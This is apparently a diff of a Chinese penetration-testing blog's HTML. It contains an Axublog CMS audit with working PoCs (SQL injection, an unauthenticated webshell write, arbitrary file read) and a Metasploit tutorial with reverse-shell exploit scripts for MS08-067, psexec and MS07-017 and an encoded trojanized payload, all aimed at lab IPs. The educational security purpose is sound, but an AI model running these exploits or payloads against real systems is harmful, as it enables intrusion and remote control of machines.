-http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=2--+</code></pre><h4 id="7-后台任意文件写入漏洞"><a href="#7-后台任意文件写入漏洞" class="headerlink" title="7.后台任意文件写入漏洞"></a>7.后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p>
+http://192.168.110.152/axublog/search.php?word=广%&#39; or 1=2--+</code></pre><h4 id="后台任意文件写入漏洞"><a href="#后台任意文件写入漏洞" class="headerlink" title="后台任意文件写入漏洞"></a>后台任意文件写入漏洞</h4><p>注明：这个后台文件上传漏洞不需要登录后台即可直接getshell</p>
 <p>漏洞点：admin/theme.php</p>
 <p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CMusic%5C1587018-20200304002821492-309441952.png" alt=""></p>
 <p>edit2save()函数进行了文件的写入操作，将REQUEST请求的的path参数和content参数分别作为作为报存的路径和内容传入file_put_contents中进行保存操作。</p>
 <p>继续寻找edit2save()函数调用点：发现当g=edit2save时调用该函数。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003116729-1307171520.png" alt="img"></p>
-<p>漏洞利用：</p>
-<pre><code>请求：
+<h5 id="漏洞利用：-2"><a href="#漏洞利用：-2" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>请求：
 http://192.168.110.152/axublog/admin/theme.php?g=edit2save
 
 post:
 path=./shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304003256803-1334544380.png" alt="img"></p>
-<h4 id="8-后台多个sql注入漏洞"><a href="#8-后台多个sql注入漏洞" class="headerlink" title="8.后台多个sql注入漏洞"></a>8.后台多个sql注入漏洞</h4><p>漏洞点：admin/admin.php</p>
+<h4 id="后台多个sql注入漏洞"><a href="#后台多个sql注入漏洞" class="headerlink" title="后台多个sql注入漏洞"></a>后台多个sql注入漏洞</h4><h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>漏洞点：admin/admin.php</p>
 <p>定位edit()函数，发现id参数没有经过过滤而直接带入sql语句进行查询了。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172222897-1426655107.png" alt="img"></p>
 <p>但是这里在获取id参数之前调用了chkoutpost()函数进行验证。跟进chkoutpost()函数。class/c_other.php</p>
@@ -1497,20 +1749,19 @@ path=./shell.php&amp;content=&lt;?php phpinfo();?&gt;</code></pre><p><img src="h
 <p>chkoutpost()函数仅仅验证了refer是否为空的情况，所以我们在利用这个sql注入漏洞是时候给refer随便赋个值即可。</p>
 <p>查看edit函数在哪里被调用了：发现当g=edit时候调用edit函数。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172752867-937007122.png" alt="img"></p>
-<p>漏洞利用：</p>
-<pre><code>poc:
+<h5 id="漏洞利用：-3"><a href="#漏洞利用：-3" class="headerlink" title="漏洞利用："></a>漏洞利用：</h5><pre><code>poc:
 http://192.168.110.152/axublog/admin/admin.php?g=edit&amp;id=1 union select 1,version(),3,4--+
 
 Referer: 任意填写</code></pre><p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304172922428-724640530.png" alt="img"></p>
 <p>6，既然这个cms的sql注入都没有进行防御，那么肯定还存在n个sql注入漏洞，此处就不一一说明了。</p>
-<h4 id="9-任意文件读取漏洞"><a href="#9-任意文件读取漏洞" class="headerlink" title="9.任意文件读取漏洞"></a>9.任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p>
+<h4 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h4><p>漏洞点：admin/app.php</p>
 <p>首先定位到edit2()函数，在edit2函数中通过调用file_get_contents函数获取变量path文件中的内容，然而变量path文件中的内容，然而变量path的值是通过request的方式从path参数获取的，并且对变量$path没有任何过滤而直接带入到file_get_contents函数进行获取文件内容，所以此处就造成了任意文件读取漏洞。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304173840167-1365630191.png" alt="img"></p>
 <p>跟进edit2()函数，寻找调用方法：当g=edit2的时候调用edit2函数。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174437952-1224821444.png" alt="img"></p>
 <p>漏洞利用：</p>
 <pre><code>poc:
-http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></pre><h4 id="10代码执行漏洞"><a href="#10代码执行漏洞" class="headerlink" title="10代码执行漏洞"></a><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174618584-506013891.png" alt="">10代码执行漏洞</h4><p>漏洞点：admin/html.php</p>
+http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></pre><h4 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304174618584-506013891.png" alt="">代码执行漏洞</h4><p>漏洞点：admin/html.php</p>
 <p>漏洞分析：在生成about页面的时候调用了ob_get_contents函数执行about.mb里面的php代码，并且没有进行任何过滤，所以我们可以通过向about.md文件中写入php代码，从而使其被执行。然而在后台管理页面中正好有编辑about页功能。</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304210913536-1220729563.png" alt="img"></p>
 <p>漏洞利用：</p>
@@ -1520,7 +1771,7 @@ http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304211905560-277463672.png" alt="img"></p>
 <p>然后我们的代码就被成功的执行了，访问shell2.php:</p>
 <p><img src="https://img2020.cnblogs.com/blog/1587018/202003/1587018-20200304212324112-1387100175.png" alt="img"></p>
-<p>res:<br><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p>
+<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="http://www.ttk7.cn/post-82.html" target="_blank" rel="noopener">http://www.ttk7.cn/post-82.html</a></p>
 <p><a href="https://blog.csdn.net/sweet0swat/article/details/89056383" target="_blank" rel="noopener">https://blog.csdn.net/sweet0swat/article/details/89056383</a></p>
 
           
@@ -1711,6 +1962,10 @@ http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></
 <p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p>
 <h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p>
 <p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p>
+<p>m’g</p>
+<h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p>
+<p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
+<p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>
 
           
         
@@ -1801,6 +2056,28 @@ http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></
           </span>
 
           
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
 
           
             
@@ -1830,8 +2107,7 @@ http://192.168.110.152/axublog/admin/app.php?g=edit2&amp;path=./app.php</code></
       
         
           
-            <h2 id="渗透测试——提权部分知识"><a href="#渗透测试——提权部分知识" class="headerlink" title="渗透测试——提权部分知识"></a>渗透测试——提权部分知识</h2><p>[TOC]</p>
-<h3 id="提权——本地提权"><a href="#提权——本地提权" class="headerlink" title="提权——本地提权"></a>提权——本地提权</h3><ul>
+            <h2 id="渗透测试——提权部分知识"><a href="#渗透测试——提权部分知识" class="headerlink" title="渗透测试——提权部分知识"></a>渗透测试——提权部分知识</h2><h3 id="提权——本地提权"><a href="#提权——本地提权" class="headerlink" title="提权——本地提权"></a>提权——本地提权</h3><ul>
 <li>已实现本地低权限账号登录<ul>
 <li>远程溢出</li>
 <li>直接获得账号密码</li>
@@ -2794,960 +3070,6 @@ root@kali:~# lastlog
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Shu1L">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/" itemprop="url">渗透测试——Mestasploit基本使用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T19:52:51+08:00">
-                2020-04-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul>
-<li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li>
-<li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li>
-<li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li>
-</ul>
-<h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul>
-<li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p>
-</li>
-<li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p>
-</li>
-<li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p>
-<ul>
-<li>框架继承了渗透测试标准（PETS）标准</li>
-<li>一定程度上统一了渗透测试研究的工作环境</li>
-<li>新的攻击代码可以比较容易的加入框架</li>
-</ul>
-</li>
-<li><p>开发活跃版本更新频繁</p>
-<ul>
-<li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li>
-<li>目前分化为四个版本，社区版依然十分活跃</li>
-<li>HD More说：为 Metasploit 写书是种自虐</li>
-</ul>
-</li>
-<li><p>Metasploit 默认集成 kali linux 中</p>
-</li>
-<li><p>使用 postgresql 数据库存储数据</p>
-<ul>
-<li>早期版本需要先启动数据库再启动 msf</li>
-</ul>
-<p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p>
-</li>
-</ul>
-<p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p>
-<h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul>
-<li>Rex<ul>
-<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
-<li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li>
-<li>编码转换（XOR、Base64、Unicode）</li>
-</ul>
-</li>
-<li>Msf::Core<ul>
-<li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li>
-</ul>
-</li>
-<li>Msf::Base<ul>
-<li>提供友好的的 API 接口，便于模块调用的库</li>
-</ul>
-</li>
-<li>Plugin 插件<ul>
-<li>连接和调用外部扩展功能和系统</li>
-</ul>
-</li>
-<li>模块<ul>
-<li>/usr/share/metasploit-framework/modules/</li>
-</ul>
-</li>
-<li>技术功能模块（不是流程模块）<ul>
-<li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
-</ul>
-</li>
-<li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul>
-<li>shellcode 或系统命令</li>
-<li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li>
-<li>Single：all-in-one</li>
-<li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li>
-<li>stages：利用 stager 建立的连接下载的后续payload</li>
-<li>stager、stages 都有多种类型，适用于不同场景</li>
-<li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li>
-</ul>
-</li>
-<li>技术功能模块（不是流程模块）<ul>
-<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li>
-<li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li>
-<li>Nops：提高 paylaod 稳定性及维持大小</li>
-</ul>
-</li>
-</ul>
-<h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul>
-<li>使用前先升级：<strong>msfupdate</strong></li>
-<li>msfcli 使用接口，现在已经更新至 msfconsole -x</li>
-<li>msfconsole 使用接口<ul>
-<li>最流行的用户接口</li>
-<li>几乎可以使用全部 msf 功能</li>
-<li>控制台命令支持 TAB 自动补全</li>
-<li>支持外部命令的执行（系统命令等）</li>
-</ul>
-</li>
-<li>点击鼠标启动</li>
-</ul>
-<pre><code>通用选项:
-    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;
-
-数据库选项:
-    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录
-    -n, --no-database                禁用数据库支持
-    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件
-
-框架选项:
-    -c FILE                          加载指定的配置文件
-    -v, -V, --version                显示版本
-
-模块选项:
-        --defer-module-loads         除非明确询问，否则推迟模块加载
-    -m, --module-path DIRECTORY      加载一个额外的模块路径
-
-控制台选项:
-    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;
-    -H, --history-file FILE          将命令历史记录保存到指定的文件
-    -L, --real-readline              使用系统Readline库而不是RbReadline
-    -o, --output FILE                输出到指定的文件
-    -p, --plugin PLUGIN              在启动时加载插件
-    -q, --quiet                      不要在启动时显示 banner 信息
-    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）
-    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）
-    -h, --help                       显示此消息</code></pre><ul>
-<li>进入 msfconsole，查看帮助信息</li>
-</ul>
-<pre><code>root@kali:~# msfconsole
-msf &gt; help
-
-核心命令
-=============
-
-    命令            描述
-    -------       -----------
-    ?             帮助菜单
-    banner        显示一个很棒的metasploit横幅
-    cd            更改当前的工作目录
-    color         切换高亮显示颜色
-    connect       连接与主机通信
-    exit          退出退出控制台
-    get           获取特定于上下文的变量的值
-    getg          获取全局变量的值
-    grep          Grep另一个命令的输出
-    help          帮助菜单
-    history       历史显示命令历史
-    irb           进入irb脚本模式
-    load          加载一个框架插件
-    quit          退出控制台
-    route         路由通过会话路由流量
-    save          保存保存活动的数据存储
-    sessions      会话转储会话列表并显示有关会话的信息
-    set           将特定于上下文的变量设置为一个值
-    setg          将全局变量设置为一个值
-    sleep         睡眠在指定的秒数内不执行任何操作
-    spool         将控制台输出写入文件以及屏幕
-    threads       线程查看和操作后台线程
-    unload        卸载卸载框架插件
-    unset         取消设置取消设置一个或多个特定于上下文的变量
-    unsetg        取消设置取消设置一个或多个全局变量
-    version       版本显示框架和控制台库版本号
-
-
-模块命令
-===============
-
-    命令            描述
-    -------       -----------
-    advanced      高级显示一个或多个模块的高级选项
-    back          返回从当前上下文返回
-    edit          编辑使用首选编辑器编辑当前模块或文件
-    info          显示有关一个或多个模块的信息
-    loadpath      加载路径搜索并加载路径中的模块
-    options       选项显示全局选项或一个或多个模块
-    popm          将最新的模块从堆栈弹出并使其处于活动状态
-    previous      将之前加载的模块设置为当前模块
-    pushm         将活动或模块列表推入模块堆栈
-    reload_all    重新加载所有定义的模块路径中的所有模块
-    reload_lib    从指定路径加载库文件
-    search        搜索搜索模块名称和说明
-    show          显示给定类型的模块或所有模块
-    use           使用按名称选择模块
-
-
-工作命令
-============
-
-    命令            描述
-    -------       -----------
-    handler       处理程序作为作业启动负载处理程序
-    jobs          作业显示和管理作业
-    kill          杀死一份工作
-    rename_job    重命名作业
-
-
-资源脚本命令
-========================
-
-    命令            描述
-    -------       -----------
-    makerc        保存从开始到文件输入的命令
-    resource      运行存储在文件中的命令
-
-
-数据库后端命令
-=========================
-
-    命令                描述
-    -------           -----------
-    db_connect        连接到现有的数据库
-    db_disconnect     断开当前数据库实例
-    db_export         导出包含数据库内容的文件
-    db_import         导入扫描结果文件（文件类型将被自动检测）
-    db_nmap           执行nmap并自动记录输出
-    db_rebuild_cache  重建数据库存储的模块缓存
-    db_status         显示当前的数据库状态
-    hosts             列出数据库中的所有主机
-    loot              列出数据库中的所有战利品
-    notes             列出数据库中的所有注释
-    services          列出数据库中的所有服务
-    vulns             列出数据库中的所有漏洞
-    workspace         在数据库工作区之间切换
-
-
-凭证后端命令
-============================
-
-    命令            描述
-    -------       -----------
-    creds         列出数据库中的所有凭据(密码)</code></pre><ul>
-<li>msf &gt; help show</li>
-</ul>
-<pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options
-[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul>
-<li>msf &gt; help search</li>
-</ul>
-<pre><code>用法: search [keywords]
-
-Keywords:
-  app       :  客户端或服务器攻击的模块
-  author    :  本作者编写的模块
-  bid       :  具有匹配的Bugtraq ID的模块
-  cve       :  具有匹配CVE ID的模块
-  edb       :  具有匹配的Exploit-DB ID的模块
-  name      :  具有匹配描述性名称的模块
-  platform  :  影响这个平台的模块
-  ref       :  具有匹配参考的模块
-  type      :  特定类型的模块（exploit，auxiliary或post）
-
-msf &gt; search ms08-067
-msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul>
-<li>模块内命令</li>
-</ul>
-<pre><code>msf &gt; search ms09_001_write
-msf &gt; use auxiliary/dos/windows/smb/ms09_001_write
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; info
-
-[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missing
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advanced
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targets
-
-
-
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit
-    用法：编辑[file / to / edit.rb]
-    使用编辑当前活动模块或本地文件。
-    如果指定了文件路径，它将在编辑后自动重新加载。
-    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。
-msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul>
-<li>数据库操作</li>
-</ul>
-<pre><code>msf &gt; help db_connect 
-    [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;
-    [*]       OR: db_connect -y [path/to/database.yml]
-    [*] Examples:
-    [*]        db_connect user@metasploit3
-    [*]        db_connect user:pass@192.168.0.2/metasploit3
-    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3
-
-msf &gt; help db_import
-    Usage: db_import &lt;filename&gt; [file2...]
-    Filenames can be globs like *.xml, or **/*.xml which will search recursively
-
-msf &gt; help db_export
-    Usage:
-    db_export -f &lt;format&gt; [filename]
-    Format can be one of: xml, pwdump</code></pre><ul>
-<li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li>
-</ul>
-<pre><code>活动的会话操作和交互。
-
-选项:
-
-    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令
-    -K        终止所有会话
-    -S &lt;opt&gt;  行搜索过滤器。
-    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令
-    -h        帮助横幅
-    -i &lt;opt&gt;  与提供的会话ID进行交互
-    -k &lt;opt&gt;  按会话ID和/或范围终止会话
-    -l        列出所有活动会话
-    -n &lt;opt&gt;  按ID命名或重命名会话
-    -q        静音模式
-    -r        重置用-i或全部给定的会话的环形缓冲区
-    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块
-    -t &lt;opt&gt;  设置响应超时（默认值：15）
-    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话
-    -v        以详细模式列出会话
-    -x        在会话表中显示扩展信息
-
-许多选项允许使用逗号和破折号指定会话范围。
-例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p>
-<pre><code>root@kali:~# cat ms08067.rb 
-use exploit/windows/smb/ms08_067_netapi
-set RHOST 10.10.10.147
-set RPORT 445
-set PAYLOAD windows/shell/reverse_tcp
-set LHOST 10.10.10.131
-set LPORT 4444
-exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
-<pre><code>root@kali:~# cat psexec.rb 
-use exploit/windows/smb/psexec
-set RHOST 10.10.10.148
-set PAYLOAD windows/shell/reverse_tcp
-set LHOST 10.10.10.131
-set LPORT 4444
-set SMBUSER Administrator
-set SMBPASS 123456
-exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
-<h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
-<pre><code>root@kali:~# cat ms07017.rb 
-use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
-set URIPATH /
-set SRVHOST 0.0.0.0
-set PAYLOAD windows/shell/reverse_tcp
-set EXITFUNC thread
-set LHOST 10.10.10.131
-set LPORT 4444
-exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
-<p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p>
-<h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
-<li>用法</li>
-</ul>
-<pre><code>msf &gt; search ms08-067
-msf &gt; use payload/windows/shell/bind_tcp
-msf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcode
-msf payload(windows/shell/bind_tcp) &gt; generate -h
-    Usage: generate [options]
-    Generates a payload.
-    OPTIONS:
-        -E        强制编码。
-        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;
-        -e &lt;opt&gt;  要使用的编码器模块的名称。
-        -f &lt;opt&gt;  输出文件名（否则为stdout）
-        -h        帮助横幅。
-        -i &lt;opt&gt;  编码迭代的次数。
-        -k        保持模板可执行的功能
-        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。
-        -p &lt;opt&gt;  输出平台
-        -s &lt;opt&gt;  NOP sled length.
-        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war
-        -x &lt;opt&gt;  要使用的可执行模板
-
-msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
-<ul>
-<li>自动绕过坏字符</li>
-</ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;
-msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul>
-<li>手动指定编码模块</li>
-</ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
-<ul>
-<li>注入文件</li>
-</ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul>
-<li><p>NOP：no-operation / Next Operation （无任何操作）</p>
-<ul>
-<li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li>
-<li>增加一行 EOP</li>
-</ul>
-<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li>
-</ul>
-<h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
-<li>高级、动态、可扩展的 payload<ul>
-<li>基于 metepreter 上下文利用更多漏洞发起攻击</li>
-<li>后渗透测试阶段一站式操作界面</li>
-</ul>
-</li>
-<li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul>
-<li>注入合法系统进程并建立 stager</li>
-<li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li>
-<li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li>
-</ul>
-</li>
-<li>服务端使用 c 语言编写</li>
-<li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
-</ul>
-<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb 
-use exploit/windows/smb/ms08_067_netapi
-set payload windows/meterpreter/reverse_tcp
-set RHOST 10.10.10.147
-set LHOST 10.10.10.131
-run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
-<ul>
-<li>帮助文件</li>
-</ul>
-<pre><code>meterpreter &gt; help
-
-核心命令
-=============
-
-    命令                     描述
-    -------                   -----------
-    ?                         帮助菜单
-    background                背景当前会话
-    bgkill                    杀死一个背景meterpreter脚本
-    bglist                    列出运行后台脚本
-    bgrun                     执行一个meterpreter脚本作为后台线程
-    channel                   显示信息或控制活动频道
-    close                     关闭频道
-    disable_unicode_encoding  禁用unicode字符串的编码
-    enable_unicode_encoding   启用unicode字符串的编码
-    exit                      终止meterpreter会话
-    get_timeouts              获取当前会话超时值
-    guid                      获取会话GUID
-    help                      帮助菜单
-    info                      显示有关Post模块的信息
-    irb                       进入irb脚本模式
-    load                      加载一个或多个meterpreter扩展
-    machine_id                获取连接到会话的计算机的MSF ID
-    migrate                   将服务器迁移到另一个进程
-    pivot                     管理数据透视监听器
-    quit                      终止meterpreter会话
-    read                      从频道读取数据
-    resource                  运行存储在文件中的命令
-    run                       执行meterpreter脚本或Post模块
-    sessions                  快速切换到另一个会话
-    set_timeouts              设置当前会话超时值
-    sleep                     Force Meterpreter安静，然后重新建立会话。
-    transport                 更改当前的传输机制
-    use                       不推荐使用“加载”别名
-    uuid                      获取当前会话的UUID
-    write                     将数据写入通道
-
-
-Stdapi: 文件系统命令
-============================
-
-    命令          描述
-    -------       -----------
-    cat           将文件的内容读取到屏幕上
-    cd            更改目录
-    checksum      检索文件的校验和
-    cp            将源复制到目标
-    dir           列表文件（ls的别名）
-    download      下载文件或目录
-    edit          编辑一个文件
-    getlwd        打印本地工作目录
-    getwd         打印工作目录
-    lcd           更改本地工作目录
-    lls           列出本地文件
-    lpwd          打印本地工作目录
-    ls            列出文件
-    mkdir         建立目录
-    mv            将源移到目标
-    pwd           打印工作目录
-    rm            删除指定的文件
-    rmdir         删除目录
-    search        搜索文件
-    show_mount    列出所有安装点/逻辑驱动器
-    upload        上传文件或目录
-
-
-Stdapi: 网络命令
-===========================
-
-    命令          描述
-    -------       -----------
-    arp           显示主机ARP缓存
-    getproxy      显示当前的代理配置
-    ifconfig      显示界面
-    ipconfig      显示界面
-    netstat       显示网络连接
-    portfwd       将本地端口转发到远程服务
-    resolve       解析目标上的一组主机名
-    route         查看和修改路由表
-
-
-Stdapi: 系统命令
-=======================
-
-    Command       Description
-    -------       -----------
-    clearev       清除事件日志
-    drop_token    放弃任何活动的模拟令牌。
-    execute       执行一个命令
-    getenv        获取一个或多个环境变量值
-    getpid        获取当前的进程标识符
-    getprivs      尝试启用当前进程可用的所有权限
-    getsid        获取运行服务器的用户的SID
-    getuid        获取服务器正在运行的用户
